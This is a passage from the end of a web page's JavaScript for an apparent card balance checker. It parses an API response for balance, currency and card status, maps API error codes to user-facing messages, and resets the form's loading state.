          if (bal !== null) {
            result = { success: true, balance: bal, currency: curr, cardLast4: digits.slice(-4), cardStatus: d.card_status || data.card_status || '' };
          } else {
            result.error = 'Balance information not available.';
          }
        } else {
          // Handle all error status codes from API docs
          const msg = data.error_message || data.error || data.message || '';
          const ERROR_MAP = {
            'WRONG_API_TOKEN': 'Service configuration error. Please contact support.',
            'INSUFFICIENT_CREDIT': 'Service temporarily unavailable. Please try again later.',
            'RATE_LIMIT': 'Too many requests. Please wait a moment and try again.',
            'WRONG_INPUT': CARD_ERROR_MSG,
            'NO_CARD_DEAILS_FOUND': 'Card details not found. Please verify and try again.',
            'UNKNOWN_CARD_BIN': 'This card type is not supported.',
            'CORRUPTED_CARD': CARD_ERROR_MSG,
            'REGISTERED_CARD': 'This card requires owner authentication. Please check with the card issuer.',
            'INVALID_CARD': 'Invalid card. Please check your card details.',
            'FAILED': msg || 'Technical failure. Please try again.',
            'TIMEOUT': 'Request timed out. Please try again.',
            'UNKNOWN_ERROR': msg || 'An unexpected error occurred. Please try again.'
          };
          result.error = ERROR_MAP[st] || msg || CARD_ERROR_MSG;

          // Fallback: check if balance exists even without OK status
          if (!result.error || result.error === CARD_ERROR_MSG) {
            const d = data.data || data;
            const raw = d.balance !== undefined ? d.balance : (d.amount !== undefined ? d.amount : data.balance);
            if (raw !== undefined && raw !== null && raw !== '') {
              const bal = typeof raw === 'number' ? raw : parseFloat(String(raw));
              if (!isNaN(bal)) {
                result = { success: true, balance: bal, currency: d.currency || data.currency || 'USD', cardLast4: digits.slice(-4) };
              }
            }
          }
        }
        showResult(result);
      } catch (err) {
        showResult({ success: false, error: 'Connection failed. Please try again.' });
      }

      loadingOverlay.classList.remove('show');
      submitBtn.disabled = false;
      submitBtn.innerHTML = '<svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Check Balance';
    };
  </script>
</body>
</html>
